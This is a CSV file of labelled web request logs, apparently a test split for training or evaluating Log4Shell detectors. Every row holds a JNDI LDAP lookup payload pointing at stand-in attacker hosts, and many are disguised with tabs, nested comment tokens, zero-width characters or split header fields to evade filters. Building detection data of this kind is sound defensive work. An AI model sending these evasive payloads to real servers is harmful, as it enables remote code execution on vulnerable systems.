id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001407,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://evil.example/tab-protocol} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi: ldap://evil.example/tab-protocol} | method: get | host: app.local | path: /,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-001408,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://evil.example/tab-protocol},request from user-agent: ${jndi: ldap://evil.example/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001409,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${jndi:	ldap://evil.example/tab-protocol},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi: ldap://evil.example/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-001410,2026-05-17,adversarial_evasion,GET /search?q=${jndi:	ldap://evil.example/tab-protocol} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi: ldap://evil.example/tab-protocol} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,whitespace_injection,path,adversarial_evasion_test,critical
LS-001411,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:	ldap://evil.example/tab-protocol},post /search http/1.1 host: app.local body: query=${jndi: ldap://evil.example/tab-protocol},1,log4shell,whitespace_injection,body,adversarial_evasion_test,critical
LS-001412,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://evil.example/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://evil.example/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-001413,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://evil.example/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://evil.example/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
LS-001414,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://evil.example/tab-protocol} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi: ldap://evil.example/tab-protocol} | method: get | host: app.local | path: /search?q=boots,1,log4shell,whitespace_injection,user_agent,adversarial_evasion_test,critical
LS-001415,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndi:	ldap://evil.example/tab-protocol},request from user-agent: ${jndi: ldap://evil.example/tab-protocol},1,log4shell,whitespace_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001416,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jndi:	ldap://evil.example/tab-protocol},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: / | x-api-version: ${jndi: ldap://evil.example/tab-protocol},1,log4shell,whitespace_injection,x_api_version,adversarial_evasion_test,critical
LS-001417,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-001418,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-001419,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001420,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001421,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j${/**/}ndi:ldap://evil.example/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001422,2026-05-17,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,comment_injection,path,adversarial_evasion_test,critical
LS-001423,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://evil.example/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://evil.example/comment-token},1,log4shell,comment_injection,body,adversarial_evasion_test,critical
LS-001424,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-001425,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://evil.example/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-001426,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001427,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: ${j${/**/}ndi:ldap://evil.example/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001428,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${/**/}ndi:ldap://evil.example/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j${/**/}ndi:ldap://evil.example/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001429,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001430,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001431,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001432,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001433,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001434,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001435,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001436,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001437,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001438,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001439,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001440,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://evil.example/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://evil.example/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001441,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001442,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001443,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001444,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001445,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001446,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001447,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001448,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001449,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001450,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001451,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001452,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://evil.example/split-field},x-custom: ${jndi x-other: :ldap://evil.example/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001549,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://attacker.evil.com/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://attacker.evil.com/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001550,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://attacker.evil.com/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://attacker.evil.com/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001551,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://attacker.evil.com/zw-d} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jnd‍i:ldap://attacker.evil.com/zw-d} | method: get | host: app.local | path: /metrics,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001552,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://attacker.evil.com/zw-d},request from user-agent: ${jnd‍i:ldap://attacker.evil.com/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001553,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jnd‍i:ldap://attacker.evil.com/zw-d},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jnd‍i:ldap://attacker.evil.com/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001554,2026-05-17,adversarial_evasion,GET /search?q=${jnd‍i:ldap://attacker.evil.com/zw-d} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jnd‍i:ldap://attacker.evil.com/zw-d} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001555,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jnd‍i:ldap://attacker.evil.com/zw-d},post /search http/1.1 host: app.local body: query=${jnd‍i:ldap://attacker.evil.com/zw-d},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001556,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://attacker.evil.com/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://attacker.evil.com/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001557,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://attacker.evil.com/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://attacker.evil.com/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001558,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://attacker.evil.com/zw-d} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jnd‍i:ldap://attacker.evil.com/zw-d} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
